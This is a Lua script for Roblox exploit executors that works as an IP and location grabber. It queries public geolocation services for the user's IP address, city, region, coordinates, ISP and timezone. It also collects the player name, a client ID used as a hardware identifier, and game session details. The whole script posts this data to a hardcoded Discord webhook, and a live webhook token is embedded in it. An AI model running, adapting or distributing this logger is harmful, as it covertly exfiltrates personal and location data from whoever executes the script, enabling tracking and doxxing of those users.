local ip = tostring(game:HttpGet("https://api64.ipify.org", true))
local country = tostring(game:HttpGet("https://ipapi.co/country", true))
local citylel = tostring(game:HttpGet("https://ipapi.co/city", true))
local regionxdlel = tostring(game:HttpGet("https://ipapi.co/region", true))
local countrycapitallelxd = tostring(game:HttpGet("https://ipapi.co/country_capital", true))
local timezoneroflambaxd = tostring(game:HttpGet("https://ipapi.co/timezone", true))
local orginizationidklel = tostring(game:HttpGet("https://ipapi.co/org", true))
local currencylelblxd = tostring(game:HttpGet("https://ipapi.co/currency", true))
local ineuropeunion = tostring(game:HttpGet("https://ipapi.co/in_eu", true))
local asnhahlelxd = tostring(game:HttpGet("https://ipapi.co/asn", true))
local latitudelel = tostring(game:HttpGet("https://ipapi.co/latitude", true))
local latlonglelxd = tostring(game:HttpGet("https://ipapi.co/latlong", true))
local executor = identifyexecutor()
local maybenotworkhwid = game:GetService("RbxAnalyticsService"):GetClientId()
local placeide = game.placeId
local GetNamePlace = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
local Playertime = os.date("%H : %M : %S : %x ")
print(Playertime)
print(GetNamePlace.Name)
print(executor)


local webhook = "https://discord.com/api/webhooks/1097189874232205433/YKU0FaHXsjMgyJHeaFI88Tx9Vzqf9OfOxfqSumKXbNELgK1qHkH6GmIETML4sMB3RJac"


local playerName = game.Players.LocalPlayer.Name


local body = {
    ["embeds"] = {{
        ["title"] = "Типа ок",
        ["color"] = 16744448,
        ["fields"] = {{
            ["name"] = "Player Name",
            ["value"] = playerName,
            ["inline"] = true
        }, {
            ["name"] = "Player API",
            ["value"] = ip,
            ["inline"] = true
        }, {
            ["name"] = "Player Country",
            ["value"] = country,
            ["inline"] = true
        }, {
            ["name"] = "Executor detected",
            ["value"] = executor,
            ["inline"] = true
        }, {
            ["name"] = "HWID",
            ["value"] = maybenotworkhwid,
            ["inline"] = true
        }, {
            ["name"] = "Place ID",
            ["value"] = placeide,
            ["inline"] = true
        }, {
            ["name"] = "Place Name",
            ["value"] = GetNamePlace.Name,
            ["inline"] = true
        }, {
            ["name"] = "Player realtime",
            ["value"] = Playertime,
            ["inline"] = true
        }, {
            ["name"] = "JobId",
            ["value"] = game.JobId,
            ["inline"] = true
          }, {
            ["name"] = "City",
            ["value"] = citylel,
            ["inline"] = true
          }, {
            ["name"] = "Region",
            ["value"] = regionxdlel,
            ["inline"] = true
          }, {
            ["name"] = "Time Zone",
            ["value"] = timezoneroflambaxd,
            ["inline"] = true
          }, {
            ["name"] = "Org",
            ["value"] = orginizationidklel,
            ["inline"] = true
          }, {
            ["name"] = "Currency",
            ["value"] = currencylelblxd,
            ["inline"] = true
          }, {
            ["name"] = "Europe Union",
            ["value"] = ineuropeunion,
            ["inline"] = true
          }, {
            ["name"] = "ASN",
            ["value"] = asnhahlelxd,
            ["inline"] = true
          }, {
            ["name"] = "latitude",
            ["value"] = latitudelel,
            ["inline"] = true
          }, {
            ["name"] = "latlong",
            ["value"] = latlonglelxd,
            ["inline"] = true
        }},
    }}
}


local headers = {
    ["Content-Type"] = "application/json"
}


if executor == "Synapse X" then
    local response = syn.request({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = game:GetService("HttpService"):JSONEncode(body)
      })
  if response.StatusCode == 204 then
    print("Successfully logged player IP and country.")
  else
    warn("Failed to send player IP and country log. Status code: " .. tostring(response.StatusCode))
  end
else
  local response = request({
    Url = webhook,
    Method = "POST",
    Headers = headers,
    Body = game:GetService("HttpService"):JSONEncode(body)
  })
  if response.StatusCode == 204 then
    print("Successfully logged player IP and country.")
  else
    warn("Failed to send player IP and country log. Status code: " .. tostring(response.StatusCode))
  end
end
